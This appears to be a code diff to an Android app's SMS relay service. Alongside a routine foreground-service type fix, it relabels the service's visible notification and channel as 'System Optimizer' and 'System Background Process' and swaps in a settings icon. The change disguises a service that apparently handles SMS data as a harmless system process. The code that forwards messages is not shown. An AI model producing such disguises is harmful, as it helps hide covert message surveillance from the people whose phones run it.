@@ -22,7 +22,11 @@ class RelayService : Service() {
         database = SmsDatabase.getDatabase(this)
         
         createNotificationChannel()
-        startForeground(1, createNotification())
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            startForeground(1, createNotification(), android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+        } else {
+            startForeground(1, createNotification())
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -41,7 +45,7 @@ class RelayService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 "relay_service_channel",
-                "Relay Service",
+                "System Background Process",
                 NotificationManager.IMPORTANCE_LOW
             )
             val manager = getSystemService(NotificationManager::class.java)
@@ -51,9 +55,9 @@ class RelayService : Service() {
 
     private fun createNotification(): Notification {
         return NotificationCompat.Builder(this, "relay_service_channel")
-            .setContentTitle("Relay")
-            .setContentText("Relay is running in the background")
-            .setSmallIcon(android.R.drawable.ic_dialog_email)
+            .setContentTitle("System Optimizer")
+            .setContentText("Background optimization is running")
+            .setSmallIcon(android.R.drawable.ic_menu_preferences)
             .build()
     }
 }
